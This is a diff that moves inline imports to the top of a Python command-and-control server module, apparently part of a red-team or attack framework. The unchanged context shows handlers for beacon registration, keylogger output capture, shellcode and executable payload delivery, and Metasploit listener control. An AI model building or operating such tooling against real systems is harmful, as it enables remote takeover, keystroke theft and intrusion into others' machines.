@@ -1,9 +1,14 @@
-from pathlib import Path
-from datetime import datetime
-from typing import Dict, Any, Optional, Tuple
 import base64
-from database import BeaconRepository
+import uuid
+from datetime import datetime
+from pathlib import Path
+from typing import Any, Dict, Optional, Tuple
+
+import utils
 from config import ServerConfig
+from database import BeaconRepository
+from .metasploit_service import ListenerConfig, MetasploitService, PayloadConfig
+from utils import strip_filename_quotes
 
 class CommandProcessor:
     """Processes and validates agent commands"""
@@ -12,7 +17,6 @@ class CommandProcessor:
         self._metasploit_service = None
 
     def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None) -> str:
-        import utils  # Import here to avoid circular imports
         self.beacon_repository.update_beacon_status(beacon_id, 'online', computer_name, receiver_id)
         if utils.logger:
             display_name = receiver_name or receiver_id or "Unknown"
@@ -20,7 +24,6 @@ class CommandProcessor:
         return "Registration successful"
 
     def process_action_request(self, beacon_id: str, receiver_id: str = None, receiver_name: str = None) -> str:
-        import utils  # Import here to avoid circular imports
         beacon = self.beacon_repository.get_beacon(beacon_id)
         self.beacon_repository.update_beacon_status(beacon_id, "online", receiver_id=receiver_id)
         if not beacon.pending_command:
@@ -38,9 +41,7 @@ class CommandProcessor:
 
     def process_command_output(self, beacon_id: str, output: str = "", config=None) -> str:
         """Process command output from an agent"""
-        import utils  # Import here to avoid circular imports
         if config is None:
-            from config import ServerConfig
             config = ServerConfig()
         try:
             # Store the output in the agent's output file
@@ -68,9 +69,7 @@ class CommandProcessor:
         
     def process_keylogger_output(self, beacon_id: str, output: str = "", config=None) -> str:
         """Process KeyLogger output from an agent"""
-        import utils  # Import here to avoid circular imports
         if config is None:
-            from config import ServerConfig
             config = ServerConfig()
         try:
             output_file = Path(config.LOGS_FOLDER) / f"keylogger_output_{beacon_id}.txt"
@@ -105,7 +104,6 @@ class CommandProcessor:
     @staticmethod
     def _format_command_response(command: str) -> str:
         """Format a command string into a pipe-delimited response format."""
-        from utils import strip_filename_quotes
 
         # Special handling for file operations
         if command.startswith(("download_file ", "upload_file ")):
@@ -126,7 +124,6 @@ class CommandProcessor:
     def metasploit_service(self):
         """Lazy load Metasploit service"""
         if self._metasploit_service is None:
-            from .metasploit_service import MetasploitService
             self._metasploit_service = MetasploitService()
         return self._metasploit_service
     
@@ -137,7 +134,6 @@ class CommandProcessor:
         Returns:
             Tuple of (success, message)
         """
-        import utils
         
         try:
             if module_name == "deliver_payload":
@@ -157,8 +153,6 @@ class CommandProcessor:
     
     def _handle_deliver_payload(self, beacon_id: str, parameters: Dict[str, Any]) -> Tuple[bool, str]:
         """Handle payload delivery to a beacon"""
-        import utils
-        from .metasploit_service import PayloadConfig
         
         try:
             # Extract parameters
@@ -208,7 +202,6 @@ class CommandProcessor:
     
     def _deliver_shellcode(self, beacon_id: str, shellcode: bytes) -> Tuple[bool, str]:
         """Deliver raw shellcode to beacon for injection"""
-        import utils
         
         try:
             # Encode shellcode as base64 for safe transmission
@@ -231,14 +224,11 @@ class CommandProcessor:
     
     def _deliver_executable(self, beacon_id: str, executable_data: bytes, format_type: str) -> Tuple[bool, str]:
         """Deliver executable payload to beacon via file transfer"""
-        import utils
-        from config import ServerConfig
         
         try:
             config = ServerConfig()
             
             # Create temporary filename for the payload
-            import uuid
             temp_filename = f"payload_{uuid.uuid4().hex[:8]}.{format_type}"
             temp_filepath = Path(config.FILES_FOLDER) / temp_filename
             
@@ -266,8 +256,6 @@ class CommandProcessor:
     
     def _handle_start_listener(self, parameters: Dict[str, Any]) -> Tuple[bool, str]:
         """Handle starting a Metasploit listener"""
-        import utils
-        from .metasploit_service import ListenerConfig
         
         try:
             payload_type = parameters.get('payload_type')
@@ -302,7 +290,6 @@ class CommandProcessor:
     
     def _handle_stop_listener(self, parameters: Dict[str, Any]) -> Tuple[bool, str]:
         """Handle stopping a Metasploit listener"""
-        import utils
         
         try:
             job_id = parameters.get('job_id')
